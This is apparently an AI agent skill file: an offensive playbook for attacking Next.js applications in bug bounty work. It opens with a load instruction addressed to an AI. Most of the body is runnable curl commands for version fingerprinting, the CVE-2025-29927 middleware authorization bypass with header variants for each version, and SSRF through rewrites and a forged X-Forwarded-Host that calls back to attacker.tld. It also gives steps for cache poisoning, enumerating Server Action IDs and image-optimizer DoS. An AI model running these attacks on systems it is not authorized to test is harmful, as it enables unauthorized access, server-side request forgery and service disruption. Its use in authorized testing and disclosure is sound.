---
name: nextjs-security
description: >-
  Next.js attack playbook. Use when targets run Next.js/React Server Components — middleware authorization bypasses, cache poisoning chains, Server Action SSRF, internal endpoint disclosure, and framework-specific CVE hunting.
---

# SKILL: Next.js Security — Framework Attack Playbook

> **AI LOAD INSTRUCTION**: Next.js-specific attacks from 2025–2026 research: middleware auth bypass via `x-middleware-subrequest` (CVE-2025-29927), internal cache poisoning chains ("stale elixir"), Server Action SSRF via `X-Forwarded-Host`, cache confusion for requests-with-bodies, and the July-2026 CVE batch. Next.js powers a huge share of bug bounty targets; framework-level bugs hit thousands of programs at once.

## 1. CORE CONCEPT

Next.js merges frontend and backend into one runtime (middleware, Server Actions, RSC, image optimizer, rewrites). Each layer trusts the others — so parser/routing disagreements *inside* the framework become exploitable without any custom code being wrong. Attack the seams between middleware ↔ routing ↔ cache ↔ server actions.

## 2. FINGERPRINTING

```bash
# Confirm Next.js + version hints
curl -s https://target.com | grep -oE 'next/dist|_next/static|__NEXT_DATA__' | head -3
curl -sI https://target.com/_next/static/chunks/main.js | head -5
# Version often leaks in build IDs / chunk names
curl -s https://target.com/_next/static/chunks/webpack.js | grep -oE 'version[^,]{0,40}'
# Probe framework endpoints
for p in /_next/image /_next/data /_next/webpack-hmr /api/health; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://target.com$p"; done
```

## 3. MIDDLEWARE AUTHORIZATION BYPASS — CVE-2025-29927

WHY IT MATTERS: Apps that do ALL authorization in `middleware.ts` can be fully bypassed — middleware never runs.

```bash
# The bypass: header makes the framework think the request IS the middleware
curl -s -o /dev/null -w "%{http_code}\n" \
  -H "x-middleware-subrequest: middleware" \
  "https://target.com/admin"

# Version-dependent payload variants:
#   <12.x / 13.x:  x-middleware-subrequest: pages/_middleware
#   14.x:          x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
#   15.x:          x-middleware-subrequest: middleware:middleware:middleware
```

Test EVERY authenticated route with each variant. If `/admin` returns 200 → critical auth bypass.
Patched: 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3+. July-2026 follow-up (CVE-2026-64642) bypasses Turbopack builds using legacy `middleware.ts` + single-locale i18n.

## 4. SSRF VIA REWRITES & SERVER ACTIONS (July 2026 batch)

```bash
# CVE-2026-64645 — rewrite destination built from request input:
# If next.config rewrites use :host* or similar captured groups:
curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/evil-host.example.attacker.tld/path"

# CVE-2026-64649 — Server Actions on custom servers forward X-Forwarded-Host:
# Find Server Action POSTs (Next-Action header), then:
curl -s -X POST "https://target.com/some-action" \
  -H "Next-Action: <action-id>" -H "X-Forwarded-Host: attacker.tld" \
  -H "Content-Type: text/plain;charset=UTF-8" --data '[]'
# Callback to attacker.tld = SSRF proof. Self-hosted/custom-server deployments most affected.
```

## 5. CACHE POISONING CHAINS — "the stale elixir" pattern

Internal cache poisoning: poison the framework's OWN data cache, not a CDN.
- Hunt cached `fetch()` calls keyed on attacker-influenced input (path segments, search params)
- Cache-key vs cache-eligibility differentials: request attributes that change the RESPONSE but not the KEY = poisoning primitive
- Requests WITH bodies hitting cached routes (CVE-2026-64648/64647): body/UTF-8 confusion swaps cached response bodies across users
- Methodology: identify `use cache`/ISR routes → find unkeyed inputs (`params.txt` fuzzing) → detect reflection → weaponize with cache-buster timing

## 6. INFO DISCLOSURE & DoS SURFACE

- CVE-2026-64643: unauthenticated disclosure of internal Server Function IDs when Cache Components bundle reflective actions with `use cache` functions — enumerate action IDs from JS chunks
- Image optimizer DoS: `/_next/image?url=<large-svg>&w=...` (CVE-2026-64644)
- Edge-runtime OOM via unbounded Server Action payloads (CVE-2026-64646)

## 7. HUNTING WORKFLOW

1. Fingerprint version → map to CVE window above
2. Enumerate routes from `_next/static/chunks/*` + `buildManifest` (see `scripts/nextjs_chunk_extractor.sh`)
3. Test middleware bypass variants on every auth-gated route
4. Grep JS chunks for Server Action IDs → test host-header SSRF
5. Check cached-fetch patterns for poisoning primitives
6. Verify against GHSA advisories before reporting; check deploy platform (Vercel/Netlify/self-hosted) — many bugs are platform-mitigated

## 8. FALSE POSITIVE TRAPS

- Middleware bypass returning 200 but serving a client-side redirect to login = NOT bypassed (check body content, not status alone)
- Platform-managed hosts overwrite `X-Forwarded-Host` — SSRF unexploitable there
- Patched minors: always confirm target's exact version before claiming

## REFERENCES
- PortSwigger Top-10 2025 #7: "Next.js, cache, and chains: the stale elixir"
- CVE-2025-29927 / GHSA-f82v-jwr5-mffw (middleware bypass)
- Vercel advisories July 2026: CVE-2026-64641..64649
